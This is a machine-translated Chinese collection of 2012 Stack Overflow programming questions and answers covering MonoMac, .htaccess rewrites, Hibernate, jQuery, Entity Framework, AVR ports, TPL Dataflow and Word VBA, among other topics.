对于新版本的 C 语言，从双输入到浮点变量的转换（赋值操作）由编译器完成，没有 'F'

```
float fraction1 = 1337;
float fraction2 = 1337.0;
float fraction3 = 1337.0F;
printf("%f, %f, %f", fraction1, fraction2, fraction3);

output(C GNU): 1337.000000, 1337.000000, 1337.000000 
```*

# mono - MonoMac 中的 NSValueTransformer

> ID：13704031
> 
> 赞同：1
> 
> 时间：2012-12-04T13:27:49.203
> 
> 标签：mono, monomac

在使用 MonoDevelop 开发 MonoMac 应用程序时，我似乎看不到[NSValueTransformer类。](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSValueTransformer_Class/Reference/Reference.html)例如，这个简单的代码给出了一个编译错误：

```
public class MyTransformer : MonoMac.Foundation.NSValueTransformer
{
} 
```

但我确实看到它添加到了 MonoMac 官方发行版的这个分支中：

[https://github.com/baulig/monomac/commit/2c4e6d24e966bb795fb70624ea5bebce74f653fc](https://github.com/baulig/monomac/commit/2c4e6d24e966bb795fb70624ea5bebce74f653fc)

为什么默认不包含它？如何在我的发行版中包含来自上述链接的提交？或者我可以在不明确引用此类/接口的情况下在 IB 中执行值转换吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:47:00.400

NSValueTransformer 是在 8 月 8 日添加的，可能早于最新版本？

我从源代码构建 monomac，并且在我的代码中使用 NSValueTransformer。

本文应该可以帮助您从源代码构建并在您的发行版中使用它：

[来自 Source 的 MonoMac](http://cocoa-mono.org/archives/80/exploring-cocoa-with-monomac-and-c-chapter-1-%E2%80%93-getting-started-%E2%80%93-part-2/)

# html - 使用 .htaccess 的清理/短 URL 无法正常工作

> ID：13704043
> 
> 赞同：0
> 
> 时间：2012-12-04T13:28:27.440
> 
> 标签：html, .htaccess, url, url-rewriting

我一直在关注一些 YouTube 视频来尝试让它工作，但它似乎不想这样做。这就是我的 .htaccess 文件的外观：

```
Options +FollowSymLinks
RewriteEngine On

RewriteCond %{SCRIPT_FILENAME} !-d
RewriteCond %{SCRIPT_FILENAME} !-f

RewriteRule RewriteRule ^(.*)$ index.php/$l 
```

**我对 .htaccess 完全陌生**，我不完全确定它是如何工作的，但我的常识告诉我只需创建一个文件，将其命名为 .htaccess 并将其放在与我的 index.php 相同的文件夹中，对吗？

所以当我去，说 index.php/foo/bar 甚至只是 /foo/bar/ 我得到一个 404 错误。

可能的问题是什么？它是安装了 PHP 5.3.10 的 Windows 2008 服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:46:19.960

作为开始你的最后一行应该是

```
RewriteRule ^(.*)$ index.php/$l 
```

它应该像您期望的那样工作......将所有请求传递给现有文件/文件夹之外的所有请求`index.php`

`.htaccess`可以在请求命中的任何文件夹中......`URL`唯一的区别是它的基础是`URL`相对于所在文件夹的`.htaccess`

例子：

```
/folder1
 .htaccess
 index.php
 /folder2
 .htaccess
 index.php 
```

如果您访问`/test.php`none 如果您的`.htaccess`文件将被处理（它与 request `URI`.

如果您访问`/folder1/test.php`相应`.htaccess`的 in`folder1`将被使用并且`$1`您`RewriteRule`将显示`test.php`的in`/folder1/`将被从`URI`.

如果您访问`/folder1/folder2/test.php`它是相似的... apache 将使用`.htaccess`from `folder2`... from`folder1`将被忽略（有点不直观）

# hibernate - 使用 Hibernate 获取两个特定日期之间的元素计数时没有得到想要的结果

> ID：13704044
> 
> 赞同：0
> 
> 时间：2012-12-04T13:28:28.290
> 
> 标签：hibernate, hibernate-criteria

这是为评估所需结果而编写的代码：

```
 Calendar c7DaysAgo = Calendar.getInstance(); // 7 days ago
    c7DaysAgo.add(Calendar.DATE, -7);

    Calendar today = Calendar.getInstance(); // today
    today.add(Calendar.DATE, 0);

    Criteria criteria = session.createCriteria(Checkin.class)
            .add(Restrictions.like("fbuid", id))
            .add(Restrictions.between("date", today.getTime(), c7DaysAgo.getTime()));
    List<Checkin> checkinList = criteria.list();
    return checkinList.size(); 
```

正在命中以检索值的表值是：

| 编号 | 日期 |fbuid | 号码 |

| 1 |2012-12-04 18:41:34 | 1111 | 16 |

| 2 |2012-12-04 18:41:34 | 1111 | 2 |

我需要今天和前 7 天之间的行数。但我得到的值是 0 而不是 2。

请帮助我，因为我无法弄清楚出了什么问题！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T17:36:20.120

我意识到我的错误......之间的参数顺序错误......应该是

```
Criteria criteria = session.createCriteria(Checkin.class)
            .add(Restrictions.like("fbuid", id))
            .add(Restrictions.between("date", c7DaysAgo.getTime(),today.getTime())); 
```

# jquery - jQuery ajax POST 使用返回的 JSON 对象

> ID：13704048
> 
> 赞同：0
> 
> 时间：2012-12-04T13:28:36.613
> 
> 标签：jquery, json

我正在尝试使用从服务器发送的 JSON 响应。Firebug 显示从服务器返回的 JSON 对象是有效的，但是由于某种原因，下面的代码失败了……：

```
<script type="text/javascript">

function isValidEmailAddress(email){
// do something ...
}

$(document).ready(function(){
    $("form").on("submit", function(e){
        if ( isValidEmailAddress($('#invite-email').val()) ) {
            // setup some local variables
            var $form = $(this),
                // let's select and cache all the fields
                $inputs = $form.find("input, select, button, textarea"),
                // serialize the data in the form
                serializedData = $form.serialize();

            // let's disable the inputs for the duration of the ajax request
            $inputs.attr("disabled", "disabled");

            // fire off the request to /form.php
            $.ajax({
                url: '<?php echo $url; ?>',
                type: "post",
                data: serializedData,
                // callback handler that will be called on success
                success: function(response, textStatus, jqXHR){
                    var is_ok = response.error_code == 0 ? true : false;  // array access also fails 
                    var msg = response.msg; // array access also fails 

                    alert(is_ok);
                    alert(msg);

                    if (is_ok){
                        $('#invite-member').text(msg);
                    }
                    else{
                        $('#error-msg').text(msg);
                        $('#error-msg').show("slow");                        
                    }
                },
                // callback handler that will be called on error
                error: function(jqXHR, textStatus, errorThrown){
                    // log the error to the console
                    console.log(
                        "The following error occured: "+
                        textStatus, errorThrown
                    );
                },
                // callback handler that will be called on completion
                // which means, either on success or error
                complete: function(){
                    // enable the inputs
                    $inputs.removeAttr("disabled");
                }
            });
        }
        else {
            $('#invite-email').val('');
        }

        return false;
    });
});

</script> 
```

我显然在做一些愚蠢的事情——但我似乎无法将手指放在上面。我错过了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:32:11.843

尝试在启动时设置此变量。

```
$.ajaxSetup({
    contentType : 'application/json',
    dataType : "json"
}); 
```

他们告诉 jQUery，返回数据类型必须被解释为 JSON。

# c# - Entity Framework Codefirst 中的日期比较帮助

> ID：13704049
> 
> 赞同：2
> 
> 时间：2012-12-04T13:28:39.000
> 
> 标签：c#, .net, entity-framework

```
 using (var attendanceContext = new AttendanceAppContext())
    {
        var compareLogin = attendanceContext.Attendances.FirstOrDefault(u =>
        u.LoginDate == DateTime.Now.Date &&
        u.Employee.Username == user.Username); 
```

代码继续，稍后使用 compareLogin 变量，但此处抛出异常：“LINQ to Entities 不支持指定的类型成员 'Date'。仅支持初始化程序、实体成员和实体导航属性。

请帮助并告诉我应该如何比较数据库中的日期。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:39:31.060

您可以使用[TruncateTime](http://msdn.microsoft.com/en-us/library/dd395596.aspx)函数：

```
using (var attendanceContext = new AttendanceAppContext())
{
    var compareLogin = attendanceContext.Attendances.FirstOrDefault(u =>
    EntityFunctions.TruncateTime(u.LoginDate) == EntityFunctions.TruncateTime(DateTime.Now) &&
    u.Employee.Username == user.Username);
} 
```

此外，如果`u.LoginDate`您的数据库中是没有时间的日期，您可以尝试使用`DateTime.Today`而不是`DateTime.Now.Date`. 如果它不起作用，只需将其提取到某个变量（例如`var today = DateTime.Today`）中并在您的 LINQ 表达式中使用它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:40:37.783

将代码更改为：

```
 var compareLogin = (from a in attendanceContext.Attendances.FirstOrDefault
                     where a.LoginDate == DateTime.Now.Date && a.Employee.Username == user.Username
                     select a).ToList(); 
```

# java - 使用 Criteria Builder 创建条件来查询抽象父类的具体子类的字段

> ID：13704058
> 
> 赞同：1
> 
> 时间：2012-12-04T13:28:53.533
> 
> 标签：java, jpa-2.0, abstract-class, criteria-api, single-table-inheritance

我正在处理用户输入文本的要求，我需要在屏幕上显示匹配的数据。

我使用 EclipseLink 作为 JPA 提供程序。

以下是代码

```
@Entity
@Table(name="customer")
public class Customer{
     private List<Address> addresses = new ArrayList<Address>();
 //other code
}

@Entity
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name = "type")
@Table(name="address")
public abstract class Address{
private String name;

}

@Entity
public class PostalAddress extends Address{
private Contact number;
}

public class Contact{
  private String number;
  public Contact(String number){
  this.number = number;
  }
} 
```

在数据库中，我有表“地址”，其中有“名称”和“编号”列。

我想使用 CriteriaBuilder 创建一个谓词来搜索表中的特定值。

我试过使用

```
criteriabuiler.like(criteriabuiler.lower(root.join("addresses", JoinType.LEFT).<String>get("number")), searchString)); 
```

但它给出了例外

```
The attribute [msisdn] from the managed type [EntityTypeImpl@27575562:Address] is not present. 
```

你能建议一种方法来实现这个东西吗？

# c# - 在 EF 中创建关系

> ID：13704060
> 
> 赞同：0
> 
> 时间：2012-12-04T13:29:02.147
> 
> 标签：c#, entity-framework

实体框架代码优先：

假设我要创建表关系，哪里是放代码的好地方？

```
 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {
        modelBuilder.Entity<table1>().HasMany(i => i.AllowedDestinations).WithMany(d => d.something)
      ...... 
```

还是 OnModelCreating 以外的其他地方？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:36:01.943

您可以创建一个名为“MYEntityConfiguration”的类（其中 MyEntity 是您尝试配置的实体类型）并从 Entity Framework 中的 EntityTypeConfiguration<> 类型继承。

例如....

```
public class Position
    {
        public int Id { get; set; }

        public string CompanyName { get; set; }

        public bool IsCurrentRole { get; set; }

        public string Summary { get; set; }

        public string Title { get; set; }

        public int? StartMonth { get; set; }

        public int? StartYear { get; set; }

        public int? EndMonth { get; set; }

        public int? EndYear { get; set; }

        public virtual User User { get; set; }
        public int UserId { get; set; }
    } 
```

以及对应的配置文件......

```
public class PositionConfiguration : EntityTypeConfiguration<Position>
{
    public PositionConfiguration()
    {
        this.ToTable("Positions");
        this.HasKey(p => p.Id);
        this.Property(p => p.Id).HasColumnName("PositionId").HasDatabaseGeneratedOption(DatabaseGeneratedOption.Identity);

        this.Property(p => p.CompanyName).HasColumnName("CompanyName");
        this.Property(p => p.EndMonth).IsOptional().HasColumnName("EndMonth");
        this.Property(p => p.EndYear).IsOptional().HasColumnName("EndYear");
        this.Property(p => p.IsCurrentRole).IsOptional().HasColumnName("IsCurrentRole");
        this.Property(p => p.StartMonth).IsOptional().HasColumnName("StartMonth");
        this.Property(p => p.StartYear).IsOptional().HasColumnName("StartYear");

        this.Property(p => p.Summary).HasColumnName("Summary");
        this.Property(p => p.Title).HasColumnName("Title");
    }
} 
```

然后在您的 DBContext... OnModelCreating...

```
protected override void OnModelCreating(DbModelBuilder modelBuilder)
        {
            modelBuilder.Configurations.Add(new PositionConfiguration());

            base.OnModelCreating(modelBuilder);
        } 
```

这将使您的配置保持良好和包含......我发现它是最好的方式。

# spring - 如何在 web.xml 之外配置 CXF servlet

> ID：13704068
> 
> 赞同：2
> 
> 时间：2012-12-04T13:29:46.270
> 
> 标签：spring, spring-mvc, cxf

我希望能够使用 spring 配置文件禁用 web 服务。我用以下内容包围了所有与 cxf 相关的 bean：

```
<beans profile="webservices">...</beans> 
```

但是剩下的是web.xml中的cxf servlet：

```
<servlet>
    <servlet-name>CXFServlet</servlet-name>
    <servlet-class>org.apache.cxf.transport.servlet.CXFServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>CXFServlet</servlet-name>
    <url-pattern>/services/*</url-pattern>
</servlet-mapping> 
```

我正在考虑将其替换为：

```
<servlet>
<servlet-name>webservicesDispatcher</servlet-name>
<servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
<load-on-startup>1</load-on-startup>
</servlet>

<servlet-mapping>
<servlet-name>webservicesDispatcher</servlet-name>
<url-pattern>/services/*</url-pattern>
</servlet-mapping> 
```

我需要配置 webservicesDispather 来做和 CXFServlet 一样的事情。到目前为止，webservicesDispatcher-servlet.xml 的内容如下所示：

```
<beans xmlns="... > 
    <beans profile="webservices">    
     <import resource="classpath:META-INF/cxf/cxf.xml" />
         <import resource="classpath:META-INF/cxf/cxf-extension-soap.xml" />
         <import resource="classpath:META-INF/cxf/cxf-servlet.xml" />    
    </beans>
</beans> 
```

那么，知道 webservicesDispatcher-servlet.xml 的内容应该是什么吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:35:51.070

AFAIK CXFServlet 必须是 CXF 流的前端控制器，DispatcherServlet 不能替代 CXFServlet 执行的功能 - 任何你希望 DispatcherServlet 单独处理 Spring MVC 流和 CXF WS 流的原因 - CXF servlet 可以参考无论哪种方式，DispatcherServlet 定义的上下文文件。

# objective-c - 想要将 3DES 加密的 NSData 转换为 NSString

> ID：13704069
> 
> 赞同：1
> 
> 时间：2012-12-04T13:29:50.140
> 
> 标签：objective-c, ios, encryption, nsdata, 3des

在我的项目中，我正在使用 3DES 加密算法加密一些数据（字符串）。我传递给加密函数的字符串返回给我一个 NSData 对象。

现在我想将 NSData 转换为 NSString，以便我可以将该字符串发送到服务器。

所以我用这段代码将 NSData 转换为 NSString

`NSString *stringCreated = [[NSString alloc] initWithData:encryptedData encoding:NSASCIIStringEncoding];`

但是当我打印这个字符串时，它在控制台上打印的字符很少。我认为很少有字符会生成“\0”序列，因为它只会将字符串打印到该字符。

我试图用它对数据进行编码，`NSUTF8StringEncoding`但它返回了我（null）。

我想将完整的字符串发送到服务器，现在该怎么办？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:43:18.390

这不起作用，因为加密的字符串是二进制数据。如果您需要使用文本表示，请将其转换为 Base64。

这里描述了 NSData 到 NSString 的转换：[Converting NSData to base64](https://stackoverflow.com/questions/2197362/converting-nsdata-to-base64)

# uiscrollview - 滚动视图中启用用户交互的子视图

> ID：13704071
> 
> 赞同：0
> 
> 时间：2012-12-04T13:29:55.297
> 
> 标签：uiscrollview, touch-event, childviewcontroller

我有一个包含 ContainerView 的 ScrollView。ContainerView 包含另一个用户应该能够平移的视图。

scrollView 仅垂直滚动，“containerView 内的视图”可向各个方向平移。这是我所拥有的

```
self.scrollView.contentSize = CGSizeMake(1024,1440);
self.modelController = [self.storyboard instantiateViewControllerWithIdentifier:@"LCProduct3DViewController"];
self.modelController.meshIdentifier = self.meshIdentifier;
[self addChildViewController:self.modelController];
self.modelController.view.frame = self.threeDView.bounds;
[self.threeDView addSubview:self.modelController.view]; 
```

发生的情况是模型控制器视图内的触摸事件和模型控制器视图之外但在滚动视图边界内的触摸事件似乎正在相互影响。我玩过

```
self.scrollView.canCancelContentTouches = NO;
self.scrollView.delaysContentTouches = NO; 
```

但还没有找到可行的解决方案。

有任何想法吗 ？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-06T12:30:15.943

可以在其他地方找到：诀窍是子类化 scrollView 并覆盖 hitTest 方法，如下所示：

```
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event
{
    UIView* result = [super hitTest:point withEvent:event];

    if ([result isKindOfClass:[GLKView class]]) {
        self.scrollEnabled = NO;
    } else {
        self.scrollEnabled = YES;
    }
    return result;
} 
```

这样 - 如果 innver 视图的 hittest 是肯定的，则滚动视图的滚动被禁用，并且只有 innver 视图会获得事件。

# c++ - 将端口作为变量传递 - AVR

> ID：13704076
> 
> 赞同：6
> 
> 时间：2012-12-04T13:30:01.823
> 
> 标签：c++, io, avr

是否可以使用 AVR 端口作为可以传递的变量？

例如

```
LED myLed(PORTA,7);   //myLED hooked to PORTA, Pin 7 
```

我想让 LED 能够采用任何 PORT / Pin 组合，所以我不想硬编码它。

请注意，端口定义为：

```
#define PINA  _SFR_IO8(0x00)
#define DDRA  _SFR_IO8(0x01)
#define PORTA _SFR_IO8(0x02) 
```

PORTA 符号解析为 (*(volatile uint8_t *)((0x02) + 0x20))

我相信这将允许我执行以下操作，但我不确定我是否需要 volatile 关键字，也不确定它是否会按预期工作

```
class LED{
public:
    LED(volatile uint8_t* port, uint8_t pin);
    {
        Port=port;
        Pin=pin;
    }
    void write(bool val)
    {
        if(val) (*Port) |= 1 << Pin;
        else    (*Port) &= ~(1 << Pin);
    }

private:
    uint8_t  Pin
    volatile uint8_t* Port;
} 
```

最后，有没有办法将端口/引脚设置为 LED 构造器的输出？这将涉及找到给定 PORT# 的相关 DDR# 寄存器。我可以假设 &DDR# 将永远是 &PORT#-1 吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-04T13:42:22.557

寄存器宏基本上是指向适当寄存器所在的内存位置的指针，所以是的，您可以使用`uint8_t volatile *`. 但是，编译器不会以这种方式生成最有效的代码——它将使用间接寻址而不是直接写入。

这就是我所做的，使用[avrlib](http://technika.junior.cz/trac/browser/avrlib)。

```
#include <avrlib/porta.hpp>
#include <avrlib/pin.hpp>
using namespace avrlib;

typedef pin<porta, 4> led_pin; 
```

然后你可以使用`led_pin`typedef，例如

```
led_pin::set(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-04-05T16:38:35.620

我就是这样做的，我对AVR不是很有经验，

```
#include <avr/io.h>

void LED(volatile uint8_t* port, uint8_t pin)
{
    // First set DDRx ; DDRx on ATmega32 is one address below port address
    *(port -1) |= (1<< pin);
    // Now set the pin high
    *port |= (1<< pin);
}

int main(void)
{
   LED(&PORTB,1);
   LED(&PORTC,2);
   LED(&PORTD,3);
    while (1) 
    {
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-06T14:50:06.227

端口只不过是 I/O 地址，因此您只需将 I/O 端口的地址传递给 LED 构造函数：

```
LED *light = new LED(&PORTA, 4); 
```

为什么这行得通？正如您已经提到的，PORTA 解决了指针的取消引用：

```
(*(volatile uint8_t *)((0x02) + 0x20)) 
```

所以在前面添加一个运算符的地址会创建

```
&(*(volatile uint8_t *)((0x02) + 0x20)) 
```

可以简化为

```
(volatile uint8_t *)((0x02) + 0x20) 
```

# javascript - 在 iPad 上使用 Safari 检测主页按钮单击

> ID：13704079
> 
> 赞同：3
> 
> 时间：2012-12-04T13:30:06.780
> 
> 标签：javascript, html, ipad, event-listener, home-button

在 iPad 上运行网络应用程序时是否可以听到“主页按钮”点击？相当于`applicationDidEnterBackground`原生 iOS 应用程序的东西。

提前致谢！

# ruby-on-rails - Rails state_machine 在暂存环境中不起作用

> ID：13704083
> 
> 赞同：0
> 
> 时间：2012-12-04T13:30:14.423
> 
> 标签：ruby-on-rails, state-machine

```
gem list state*

*** LOCAL GEMS ***
state_machine (1.1.2) 
```

在我的开发环境的控制台中：

```
>> require 'state_machine'
=> [] 
```

在我的暂存环境中：

```
>> require 'state_machine'
=> false 
```

两种环境都有相同的 state_machine (1.1.2)。

有谁知道为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:40:05.750

首先，如果`require`返回false，只表示文件已经加载成功。

您是否使用捆绑器来管理宝石？假设是 Rails 3 应用程序，这是默认设置，您绝对应该使用它。如果您有一个单独的环境（使用 Rails 中的“环境”含义）进行暂存，那么请确保您的 Gemfile.rb 列出了`state_machine`所有环境的 gem。最后，为了使 Gemfile.rb 的更改生效，您必须`bundle install`在它在 Rails 中可用之前运行。

# c# - 在 ActionBlock 中等待异步 lambda

> ID：13704087
> 
> 赞同：6
> 
> 时间：2012-12-04T13:30:27.700
> 
> 标签：c#, asynchronous, task-parallel-library, async-await, tpl-dataflow

我有一个带有 ActionBlock 的类 Receiver：

```
public class Receiver<T> : IReceiver<T>
{

  private ActionBlock<T> _receiver;

  public Task<bool> Send(T item) 
  {
     if(_receiver!=null)
        return _receiver.SendAsync(item);

     //Do some other stuff her
  }

  public void Register (Func<T, Task> receiver)
  {
    _receiver = new ActionBlock<T> (receiver);
  }

  //...
} 
```

ActionBlock 的 Register-Action 是带有 await-Statement 的异步方法：

```
private static async Task Writer(int num)
{
   Console.WriteLine("start " + num);
   await Task.Delay(500);
   Console.WriteLine("end " + num);
} 
```

现在我想做的是同步等待（如果设置了条件），直到操作方法完成以获得独占行为：

```
var receiver = new Receiver<int>();
receiver.Register((Func<int, Task) Writer);
receiver.Send(5).Wait(); //does not wait the action-await here! 
```

问题是当“等待 Task.Delay(500);” 语句被执行，“receiver.Post(5).Wait();” 不再等待。

我尝试了几种变体（TaskCompletionSource、ContinueWith、...），但它不起作用。

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:50:53.903

`ActionBlock`默认情况下将强制执行排他行为（一次只处理一项）。如果您通过“排他行为”表示其他意思，您可以`TaskCompletionSource`在操作完成时通知您的发件人：

```
... use ActionBlock<Tuple<int, TaskCompletionSource<object>>> and Receiver<Tuple<int, TaskCompletionSource<object>>>
var receiver = new Receiver<Tuple<int, TaskCompletionSource<object>>>();
receiver.Register((Func<Tuple<int, TaskCompletionSource<object>>, Task) Writer);
var tcs = new TaskCompletionSource<object>();
receiver.Send(Tuple.Create(5, tcs));
tcs.Task.Wait(); // if you must

private static async Task Writer(int num, TaskCompletionSource<object> tcs)
{
  Console.WriteLine("start " + num);
  await Task.Delay(500);
  Console.WriteLine("end " + num);
  tcs.SetResult(null);
} 
```

或者，您可以使用[`AsyncLock`](http://blogs.msdn.com/b/pfxteam/archive/2012/02/12/10266988.aspx)（[包含在我的 AsyncEx 库中](http://nitoasyncex.codeplex.com/wikipage?title=AsyncLock)）：

```
private static AsyncLock mutex = new AsyncLock();

private static async Task Writer(int num)
{
  using (await mutex.LockAsync())
  {
    Console.WriteLine("start " + num);
    await Task.Delay(500);
    Console.WriteLine("end " + num);
  }
} 
```

# vba - 检测书签两侧是否有空格，如果没有添加它们

> ID：13704089
> 
> 赞同：0
> 
> 时间：2012-12-04T13:30:33.607
> 
> 标签：vba, ms-word, word-2003

我在几个 Word 文档中有几个书签，这些书签需要在所有书签之前和之后添加空格，其中一个或两个当前不存在单个空格。我只想能够解析当前文件。

我已经尝试了几种方法来做到这一点，其中几种方法会创建无限循环。

使用以下代码，我取得了一定程度的成功，但是它在此过程中创建了一个无限循环。我尝试浏览 Bookmark 对象，依次选择每个对象并在前后添加一个空格，这会导致将空格放在书签内，或者它会忽略空格应该放在的位置并将其放在后面。

我有一个在文档上运行的宏，它显示书签并将其放置在大于和小于符号之间，例如“ `««bookmarkname»»`”，以使其更易于解析。

这是我的代码：

```
Sub new_test()
    Dim sT As String
    Dim boo As Boolean
    boo = False

    Selection.Find.ClearFormatting
    With Selection.Find
         .Text = "««*»»[ ]"
        .Forward = False
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchAllWordForms = False
        .MatchSoundsLike = False
        .MatchWildcards = True
         Do While .Execute
            With Selection
                'sT = Selection.Text

                If (boo = False) Then
                    MsgBox "Added a character after bookmark"
                    Selection.InsertAfter (" ")
                    boo = True
                End If
            End With
            boo = False
        Loop
    End With
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T15:35:35.963

好的 - 解决了。也许它会证明对某人有用。

在我运行这个之前，我在文档上运行了另一个函数，它显示了所有的书签，并在它们周围放置了更多和更少的符号，如下所示：`"««BOOKMARKNAME»»"`

```
Sub bookmarks_ensure_space_beforeAfter()

    ' Before we can do any work, we need a list of bookmarks from the document
    Dim bmks As Variant
    bmks = create_array_of_bookmark_names() ' array of bookmark names

    ' This Assumes that there will not be more than 1000 bmks in the array fetched from the Word Doc

    For i = 0 To 1000

        If (bmks(i) <> "") Then
            ' if the 'bmk' is not null then process it
            ' there are likely to be several 100 that are empty

            Dim wrd As String
            Dim rng As Range

            Call select_a_string("««" & bmks(i) & "»»") ' select the bookmark
            wrd = "««" & bmks(i) & "»»"
            Set rng = Selection.Range

            ' now move the cursor two places the left of the bookmark
            Selection.MoveLeft Unit:=wdCharacter, count:=2
            ' now select the character infront of the cursor (which is now the character infront of the bmk)
            Selection.MoveRight Unit:=wdCharacter, count:=1, Extend:=wdExtend
            If (Selection.Text <> " ") Then
                ' if this character now selected is not a space - add one
                rng.InsertBefore " "
            End If

            ' now move the cursor to the right of the bookmark (using it's length as a character limit)
            Selection.MoveRight Unit:=wdCharacter, count:=Len(wrd) + 1
            ' due to bookmarks being fiddly, recreate the same bmk directly after the original
            With ActiveDocument.Bookmarks
                .Add Range:=Selection.Range, Name:=bmks(i)
                .DefaultSorting = wdSortByName
                .ShowHidden = False
            End With

            ' now we have a new bmk, select the character directly after the bmk)
            Selection.MoveRight Unit:=wdCharacter, count:=1, Extend:=wdExtend

            If (Selection.Text <> " ") Then
                ' if this character now selected is not a space - add one
                rng.InsertAfter " "
            End If

        End If
    Next
End Sub

Function create_array_of_bookmark_names() As Variant
    ' This function creates an array of bookmarks in the document and returns them as an array
    Dim array_of_bmk(1000) As Variant
    Dim c As Integer
    c = 0
    For Each mBookmark In ActiveDocument.Bookmarks()
        array_of_bmk(c) = mBookmark.Name
        c = c + 1
    Next
    ' now return this array
    create_array_of_bookmark_names = array_of_bmk

End Function
Sub select_a_string(str)
    ' This finds and selects a string of characters
    Selection.Find.ClearFormatting
    With Selection.Find
        .Text = str
        '.Replacement.Text = ""
        .Forward = True
        .MatchCase = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
End Sub 
```

# c# - C# win form 应用程序在 rar 文件之外不起作用

> ID：13704090
> 
> 赞同：-5
> 
> 时间：2012-12-04T13:30:33.617
> 
> 标签：c#, excel, debugging, c#-4.0, interop

我有一个非常奇怪的“错误”，我不知道它可能是什么。应用程序是使用 .net 4 框架使用 VS2010 制作的。除了普通程序集，它还使用 MS 互操作 for excel。我在客户端计算机上安装了 Office 2010。

基本上，应用程序解析 excel 表并制作另一个（新文件）结果。问题：当我将 exe 文件复制到桌面（或 PC 上的任何其他位置）时，它会抛出异常，但是当它在存档 (RAR) 中并且存档在桌面上时，它可以正常工作。

我无法安装它，因为他们的系统（电话公司）非常严格，根本不应该使用该应用程序。（工人手动解析，一般需要3个小时，而程序5秒，所以老板不知道，因为他认为他们都很努力:)）。

该问题在公司内的其他机器上仍然存在，因此不是孤立的情况。

任何有关它的信息都会受到赞赏。PS如果需要更多信息，请大声疾呼。这是未处理异常的“详细信息”。

有关调用即时 (JIT) 调试而不是此对话框的详细信息，请参阅此消息的末尾。

> ************** 异常文本 ************** System.ArgumentOutOfRangeException：索引和长度必须引用字符串中的位置。参数名称：System.String.InternalSubStringWithChecks(Int32 startIndex, Int32 length, Boolean fAlwaysCopy) at System.String.Substring(Int32 startIndex, Int32 length) at ExcelSvjetlana.Form1.buttonObradi_Click(Object sender, EventArgs e) at System.Windows 的长度.Forms.Control.OnClick(EventArgs e) 在 System.Windows.Forms.Button.OnClick(EventArgs e) 在 System.Windows.Forms.Button.OnMouseUp(MouseEventArgs 事件) 在 System.Windows.Forms.Control.WmMouseUp(Message& m，MouseButtons 按钮，Int32 点击）在 System.Windows.Forms.Control.WndProc(Message& m) 在 System.Windows.Forms.ButtonBase.WndProc(Message&
> 
> ```
> ************** Loaded Assemblies **************
> mscorlib
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.239 (RTMGDR.030319-2300)
>     CodeBase: file:///C:/Windows/Microsoft.NET/Framework/v4.0.30319/mscorlib.dll
> ----------------------------------------
> ExcelSvjetlana
>     Assembly Version: 1.0.0.0
>     Win32 Version: 1.0.0.0
>     CodeBase: file:///C:/Users/sobradovic/Desktop/Interno.exe
> ----------------------------------------
> System.Windows.Forms
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1 built by: RTMRel
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Windows.Forms/v4.0_4.0.0.0__b77a5c561934e089/System.Windows.Forms.dll
> ----------------------------------------
> System.Drawing
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.276 built by: RTMGDR
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Drawing/v4.0_4.0.0.0__b03f5f7f11d50a3a/System.Drawing.dll
> ----------------------------------------
> System
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.258 built by: RTMGDR
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System/v4.0_4.0.0.0__b77a5c561934e089/System.dll
> ----------------------------------------
> System.Data
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1 (RTMRel.030319-0100)
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_32/System.Data/v4.0_4.0.0.0__b77a5c561934e089/System.Data.dll
> ----------------------------------------
> System.Core
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1 built by: RTMRel
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Core/v4.0_4.0.0.0__b77a5c561934e089/System.Core.dll
> ----------------------------------------
> System.Xml
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1 built by: RTMRel
>     CodeBase: file:///C:/Windows/Microsoft.Net/assembly/GAC_MSIL/System.Xml/v4.0_4.0.0.0__b77a5c561934e089/System.Xml.dll
> ----------------------------------------
> System.Numerics
>     Assembly Version: 4.0.0.0
>     Win32 Version: 4.0.30319.1 built by: RTMRel
